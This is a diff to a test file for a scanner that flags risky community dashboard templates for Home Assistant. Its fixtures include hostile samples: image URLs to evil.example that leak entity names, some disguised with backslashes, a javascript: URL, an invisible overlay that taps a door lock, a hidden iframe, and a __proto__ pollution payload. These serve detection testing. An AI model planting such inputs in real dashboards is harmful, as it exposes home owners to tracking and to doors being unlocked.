@@ -280,8 +280,9 @@ check('what a post would do once installed is spelt out', communityRisks(risky),
   embeds: true,
   scripts: true,
   placeholders: false,
+  overlay: false,
 });
-const nothing = { actions: [], urls: [], embeds: false, scripts: false, placeholders: false };
+const nothing = { actions: [], urls: [], embeds: false, scripts: false, placeholders: false, overlay: false };
 check(
   'a harmless post has nothing to say',
   communityRisks(parseDiscussion(post(906, '```yaml\n' + TILE + '```'))),
@@ -304,7 +305,7 @@ check(
     '  entity: light.x',
     '  tap_action: {action: "[[a]]", perform_action: lock.unlock}',
   ]),
-  { actions: ['lock.unlock'], urls: [], embeds: false, scripts: false, placeholders: true },
+  { actions: ['lock.unlock'], urls: [], embeds: false, scripts: false, placeholders: true, overlay: false },
 );
 check(
   "and with a declared variable's default too",
@@ -399,7 +400,14 @@ check(
     '  tap_action: {action: fire-dom-event, browser_mod: {service: lock.unlock}}',
     '  hold_action: {action: url, url_path: "javascript:alert(1)"}',
   ]),
-  { actions: ['fire-dom-event'], urls: ['javascript:alert(1)'], embeds: false, scripts: false, placeholders: false },
+  {
+    actions: ['fire-dom-event'],
+    urls: ['javascript:alert(1)'],
+    embeds: false,
+    scripts: true,
+    placeholders: false,
+    overlay: false,
+  },
 );
 
 check(
@@ -430,6 +438,168 @@ check(
     '  card: {type: tile, entity: "${states[\'light.x\'].entity_id}"}',
   ]).scripts,
   true,
+);
+
+/* --- what the scan missed until review 2026-10-25 --- */
+
+check(
+  'a repeat over the registry that reaches locks, pressed through a placeholder, is spelt out',
+  risksOf(
+    [
+      'card: {type: custom:decluttering-card-plus, template: light_tile, for_each_from: {domain: lock}}',
+      'includes:',
+      '  light_tile: {card: {type: button, name: Lights, entity: "[[entity]]", tap_action: {action: toggle}}}',
+    ],
+    'room_lights',
+  ).actions,
+  ['toggle lock.*'],
+);
+check(
+  'a repeat over every entity reaches everything',
+  risksOf(
+    [
+      'card: {type: custom:decluttering-card-plus, template: t, for_each_from: {entities: true}}',
+      'includes:',
+      '  t: {card: {type: tile, entity: "[[entity]]", tap_action: {action: toggle}}}',
+    ],
+    'r',
+  ).actions,
+  ['toggle *'],
+);
+check(
+  'a repeat over lights pressed through a placeholder is what a repeat is for',
+  risksOf(
+    [
+      'card: {type: custom:decluttering-card-plus, template: t, for_each_from: {entities: "light.*"}}',
+      'includes:',
+      '  t: {card: {type: tile, entity: "[[entity]]", tap_action: {action: toggle}}}',
+    ],
+    'r',
+  ).actions,
+  [],
+);
+check(
+  'a lock passed to a template as a variable is seen inside that template',
+  risksOf(
+    [
+      'card: {type: custom:decluttering-card-plus, template: t, variables: [{entity: lock.front}]}',
+      'includes:',
+      '  t: {card: {type: tile, entity: "[[entity]]", tap_action: {action: toggle}}}',
+    ],
+    'r',
+  ).actions,
+  ['toggle lock.front'],
+);
+check(
+  "and so is one passed to the post's own template by a card inside it",
+  risksOf(
+    [
+      'card:',
+      '  type: vertical-stack',
+      '  cards:',
+      '    - {type: custom:decluttering-card-plus, template: r, variables: {entity: lock.front}}',
+      '    - {type: tile, entity: "[[entity]]", tap_action: {action: toggle}}',
+    ],
+    'r',
+  ).actions,
+  ['toggle lock.front'],
+);
+check(
+  'an auto-entities filter on locks with a toggle in its options is spelt out',
+  risksOf([
+    'card:',
+    '  type: custom:auto-entities',
+    '  card: {type: entities}',
+    '  filter: {include: [{domain: lock, options: {tap_action: {action: toggle}}}, {domain: light, options: {tap_action: {action: toggle}}}]}',
+  ]).actions,
+  ['toggle lock.*'],
+);
+check(
+  'a toggle on a valve, a siren, an automation or a water heater is spelt out too',
+  risksOf([
+    'card:',
+    '  type: vertical-stack',
+    '  cards:',
+    '    - {type: tile, entity: valve.water_main, tap_action: {action: toggle}}',
+    '    - {type: tile, entity: siren.alarm, tap_action: {action: toggle}}',
+    '    - {type: tile, entity: automation.away, tap_action: {action: toggle}}',
+    '    - {type: tile, entity: water_heater.tank, tap_action: {action: toggle}}',
+  ]).actions,
+  ['toggle automation.away', 'toggle siren.alarm', 'toggle valve.water_main', 'toggle water_heater.tank'],
+);
+check(
+  'an address written with backslashes, or with its scheme but no slashes, is still an address',
+  risksOf([
+    'card:',
+    '  type: vertical-stack',
+    '  cards:',
+    '    - {type: picture, image: "/\\\\evil.example/p.png?n=[[entity|friendly_name]]"}',
+    '    - {type: picture, image: "https:evil.example/x"}',
+    '    - {type: picture, image: "evil.example/y.png"}',
+    '    - {type: markdown, content: "<img src=\\"\\\\\\\\evil.example\\\\q.gif\\">"}',
+    '    - {type: custom:button-card, styles: {card: ["background: url(\'/\\\\evil.example/x\')", "background: image-set(\'//evil.example/z\' 1x)"]}}',
+  ]).urls,
+  [
+    '//evil.example/p.png?n=[[entity|friendly_name',
+    '//evil.example/q.gif',
+    '//evil.example/x',
+    '//evil.example/z',
+    'evil.example/y.png',
+    'https:evil.example/x',
+  ],
+);
+check(
+  "an icon, a local picture, a placeholder and this Home Assistant's own paths are not addresses",
+  risksOf([
+    'card:',
+    '  type: vertical-stack',
+    '  cards:',
+    '    - {type: picture, image: /local/p.png, icon: mdi:lightbulb}',
+    '    - {type: picture, image: "[[image]]"}',
+    '    - {type: picture, image: "/api/camera_proxy/camera.x"}',
+    '    - {type: picture, image: "data:image/png;base64,AAAA"}',
+    '    - {type: tile, entity: light.x, name: "Kitchen 12:30"}',
+  ]).urls,
+  [],
+);
+check(
+  'a style that lays the card invisibly over the screen is spelt out',
+  risksOf([
+    'card:',
+    '  type: custom:button-card',
+    '  tap_action: {action: toggle, target: {entity_id: lock.front}}',
+    '  card_mod: {style: "ha-card { position: fixed; inset: 0; opacity: 0; }"}',
+  ]).overlay,
+  true,
+);
+check(
+  'a code block hidden in an HTML comment is not the template; the one people see is',
+  extractYaml(
+    '<!--\n```yaml\ntemplate: hidden\ncard: {type: iframe, url: https://evil.example/}\n```\n-->\n```yaml\ntemplate: shown\ncard: {type: tile}\n```\n',
+  ),
+  'template: shown\ncard: {type: tile}\n',
+);
+check(
+  'a code block indented four spaces shows as text on GitHub, so it is not the template',
+  extractYaml('    ```yaml\n    a: 1\n    ```\n```yaml\nb: 2\n```\n'),
+  'b: 2\n',
+);
+check(
+  'a title padded with blank-looking characters is cut back, and a long one is cut short',
+  (() => {
+    const { cleanTitle } = require('../.test-build/community.js');
+    return [
+      cleanTitle('Room light tile by tempus2016' + '⠀'.repeat(40) + 'x'),
+      cleanTitle('a'.repeat(100)).length,
+      cleanTitle('⠀⠀'),
+    ];
+  })(),
+  ['Room light tile by tempus2016x', 80, undefined],
+);
+check(
+  'a post whose title is nothing but blanks is listed under its template name',
+  parseDiscussion(post(911, '```yaml\n' + TILE + '```', { title: '⠀ ㅤ' })).title,
+  'tile_light',
 );
 
 /* --- fetchCommunity --- */
@@ -526,6 +696,14 @@ function respond(status, body, headers = {}) {
           updated: '',
         },
         { id: 'x', name: 5 },
+        {
+          id: 2,
+          name: 'proto',
+          template: { card: { type: 'tile', __proto__: { polluted: true } } },
+          includes: {},
+        },
+        { id: 3, name: 'huge', template: { card: { type: 'tile', pad: 'x'.repeat(400000) } } },
+        { id: 4, name: 'nothing', template: { description: 'defines no card' } },
       ],
     }),
   );
@@ -533,7 +711,15 @@ function respond(status, body, headers = {}) {
   check(
     'a cached list is read back as carefully as a fetched one',
     readBack.entries.map((each) => [each.id, each.url]),
-    [[1, 'https://github.com/tempus2016/decluttering-card-plus/discussions/1']],
+    [
+      [1, 'https://github.com/tempus2016/decluttering-card-plus/discussions/1'],
+      [2, 'https://github.com/tempus2016/decluttering-card-plus/discussions/2'],
+    ],
+  );
+  check(
+    'and a __proto__ key in it is a key no longer, while an oversized or empty entry is dropped',
+    [Object.prototype.hasOwnProperty.call(readBack.entries[1].template.card, '__proto__'), {}.polluted],
+    [false, undefined],
   );
 
   /* ------------------------------------------------------------- updates for installed templates */
